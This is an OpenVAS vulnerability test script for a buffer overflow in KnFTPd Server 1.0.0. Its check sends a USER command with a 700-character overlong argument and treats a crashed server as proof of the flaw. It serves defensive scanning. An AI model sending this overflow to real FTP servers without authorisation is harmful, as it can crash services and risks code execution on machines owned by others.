###############################################################################
# OpenVAS Vulnerability Test
#
# KnFTPd FTP Server Multiple Commands Remote Buffer Overflow Vulnerabilities
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802034");
  script_version("2022-04-28T13:38:57+0000");
  script_cve_id("CVE-2011-5166");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-09-07 08:36:57 +0200 (Wed, 07 Sep 2011)");
  script_name("KnFTPd FTP Server Multiple Commands Remote Buffer Overflow Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/ftp_ready_banner/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/519498");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49427");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/69557");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/104731");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code on the system or cause the application to crash.");

  script_tag(name:"affected", value:"KnFTPd Server Version 1.0.0.");

  script_tag(name:"insight", value:"The flaws are due to an error while processing the multiple
  commands, which can be exploited to cause a buffer overflow by sending a
  command with specially-crafted an overly long parameter.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"KnFTPd Server is prone to multiple buffer overflow vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);
banner = ftp_get_banner(port:port);
if(!banner || "220 FTP Server ready" >!< banner)
  exit(0);

soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

send(socket:soc, data:"OVTest");
resp = recv(socket:soc, length:1024);
if("502 OVTest not found." >!< resp){
  ftp_close(socket:soc);
  exit(0);
}

attack = string("USER ", crap(data: "A", length: 700), "\r\n");
send(socket:soc, data:attack);
ftp_close(socket:soc);

sleep(2);

soc1 = open_sock_tcp(port);
if(!soc1) {
  security_message(port:port);
  exit(0);
}

resp = recv(socket:soc1, length:1024);
ftp_close(socket:soc1);

if(!resp || "220 FTP Server ready" >!< resp){
  security_message(port:port);
  exit(0);
}
